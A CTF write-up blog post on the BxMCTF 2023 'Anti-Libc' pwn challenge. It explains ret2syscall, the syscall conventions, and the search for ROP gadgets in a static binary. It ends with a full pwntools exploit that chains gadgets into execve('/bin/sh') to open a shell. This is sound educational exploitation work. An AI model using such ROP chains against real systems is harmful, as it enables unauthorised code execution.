---
layout: "single"
title: "CTF-PWN-Stack Overflow-Basic ROP-[ret2syscall]"
date: "2023-11-21 16:53:00 +0800"
categories:
  - "CTF and Pwn"
tags:
  - "Learning"
  - "Pwn"
  - "CTF"
  - "ROP"
series: "CTF Writeup"
excerpt: "Found there is a mov %rbp %rsp here, so if the previously stored rbp is suitable, we can continue ROP; rbp should be the sixteen bytes before the syscall invocation, because there are also pop rbp and pop rbx to offset. The 64-bit syscall number goes in rax; parameters are passed in order: RDI, RSI, RDX, R10, R8, R9 (same as 64-bit function parameter passing). If start and end are found to be the same, re-input; otherwise return the byte at the start position of the array where the input data resides. The 32-bit syscall numbers are somewhat different from the 64-bit ones; it's best to google them when using. There is an obvious overflow in the sys_read here."
source: "CSDN"
original_url: "https://blog.csdn.net/llovewuzhengzi/article/details/134494797"
csdn_article_id: "134494797"
migrated: true
permalink: /posts/csdn-134494797/
redirect_from:
  - "/en/CTF与Pwn/csdn-134494797/"
  - "/CTF与Pwn/csdn-134494797/"
---

{% raw %}
# ret2syscall
That is, control the program to execute a system call to obtain a shell.

# BxMCTF 2023  Anti-Libc
## main
![Image](/images/csdn/2023/csdn-134494797/image-001-a44f0f3f86.png)
## write_buf
Writes characters, to be output later
![Image](/images/csdn/2023/csdn-134494797/image-002-4efd7d8a87.png)
## flush_obuf
Outputs characters to the screen
![Image](/images/csdn/2023/csdn-134494797/image-003-7da5b3ea4a.png)
## readint
Input the length of the number to be entered next; the sign is judged and branched accordingly
![Image](/images/csdn/2023/csdn-134494797/image-004-1e9bc478c7.png)
## read_buf
If start and end are found to be the same, re-input; otherwise return the byte at the start position of the array where the input data resides
There is an obvious overflow in the sys_read here
![Image](/images/csdn/2023/csdn-134494797/image-005-3c83aeab20.png)
# Approach
Not gonna lie, this pile of shit is really convoluted (I'm too much of a noob)
The shitty part is that in the final loop of the assembly source there is an inc r10, but IDA doesn't show it, directly continuing to assign in place EMMMMMMM
![Image](/images/csdn/2023/csdn-134494797/image-006-6802de48de.png)
![Image](/images/csdn/2023/csdn-134494797/image-007-07d2479403.png)
After discovering this bug, the challenge became much easier

Check the file's static linking
![Image](/images/csdn/2023/csdn-134494797/image-008-d3a066ed0d.png)
Check protections (doesn't match foreigners' challenge-setting style at all)
![Image](/images/csdn/2023/csdn-134494797/image-009-5182605312.png)
Definitely overflow to construct a ROP chain, then make a system call

> The syscall principles for 32-bit and 64-bit are the same
Only parameter passing and invocation differ; explained together below for comparison
32-bit system calls use " int 80h "
64-bit system calls use " syscall " (the assembly instruction is just syscall; just search directly with ROPgadget --only)
The 32-bit syscall numbers are somewhat different from the 64-bit ones; it's best to google them when using
For example
32-bit     #define __NR_execve 11
64-bit     #define __NR_execve 59
The 32-bit syscall number goes in eax; parameters are passed in order: EBX, ECX, EDX, ESI, EDI, EBP
The 64-bit syscall number goes in rax; parameters are passed in order: RDI, RSI, RDX, R10, R8, R9  (same as 64-bit function parameter passing)

First find rdi
![Image](/images/csdn/2023/csdn-134494797/image-010-6c1e9acbad.png)
0x0000000000401135 is selected
Look at jmp  0x401106
![Image](/images/csdn/2023/csdn-134494797/image-011-1d802aab3e.png)
There is a ret, but the value of esi is decremented by 1 and the value of rdi is incremented by 1
emmm but with some construction it should be fine
Try rax
![Image](/images/csdn/2023/csdn-134494797/image-012-7bcf4dfde4.png)
Failed
Try eax
![Image](/images/csdn/2023/csdn-134494797/image-013-c0daf39a28.png)
Failed
ax
![Image](/images/csdn/2023/csdn-134494797/image-014-4e70f90c5b.png)
Failed
al
![Image](/images/csdn/2023/csdn-134494797/image-015-fbe2604509.png)
Also failed
Can only search in the disassembly

![Image](/images/csdn/2023/csdn-134494797/image-016-7d23d944dc.png)
Found it
![Image](/images/csdn/2023/csdn-134494797/image-017-649c3ae9c6.png)
Look at the assembly code at the corresponding position
![Image](/images/csdn/2023/csdn-134494797/image-018-db86335592.png)
Found that the %ebx register needs to be constructed
There happens to be one below
![Image](/images/csdn/2023/csdn-134494797/image-019-af718a3f0f.png)
Beautiful, beautiful
So how do we finally invoke the system call?
Found there is a mov %rbp %rsp here, so if the previously stored rbp is suitable, we can continue ROP; rbp should be the sixteen bytes before the syscall invocation, because there are also pop rbp and pop rbx to offset

# exp
A really shitty point is... I forgot that if the interval between two sendline calls is too short, the program treats them as received all at once
```python
from pwn import *
#context(os="linux",arch="amd64",log_level="debug")
e = ELF("./main")
p = process("./main")
#p = gdb.attach(p, "b*main")
offset = 64  
input_buf = 0x402020
onemore = b"\x00"
BIN_SH = b"/bin/sh\x00"
EVIL = onemore + BIN_SH 
DUMMY_RBP = p64(1)  #随便填
DUMMY_RBX = p64(1)  #随便填
SYSCALL = p64(0x401055)
EVIL_ADDRESS = input_buf +len(DUMMY_RBP + DUMMY_RBX + SYSCALL)#作为rdi
POP_RSI_RDI = p64(0x401135)  # pop rsi ; pop rdi ; jmp 0x401106
POP_RBX = p64(0x40109C)
MOV_EBX_EAX = p64(
    0x40108D
)  # mov %ebx,%eax ; neg %ebx; cmpb $0x1,(%rsp); cmove %ebx,%eax ; mov %rbp,%rsp ; pop %rbp ; pop %rbx; ret
RSI = p64(1)
RDI = p64(EVIL_ADDRESS)
RBX = p64(0x3B)  # it'll go into RAX which is needed for correct syscall
RBP = p64(input_buf)  # 最后的MOV_EBX_EAX这个地方最后有mov %rbp,%rsp ; pop %rbp ; pop %rbx; ret从而可以执行系统调用


payload = DUMMY_RBP + DUMMY_RBX + SYSCALL + EVIL
padding = b"A" * (offset - len(DUMMY_RBP + DUMMY_RBX + SYSCALL + EVIL))
payload += padding + RBP + POP_RSI_RDI + RSI + RDI
payload += POP_RBX + RBX + MOV_EBX_EAX
print(len(payload))
print(p.recvuntil("input? "))
p.sendline(str(len(payload)))
sleep(3)   # 防止间隔时间太多被当作一次性发过去了
p.sendline(payload)
p.interactive()
```
{% endraw %}
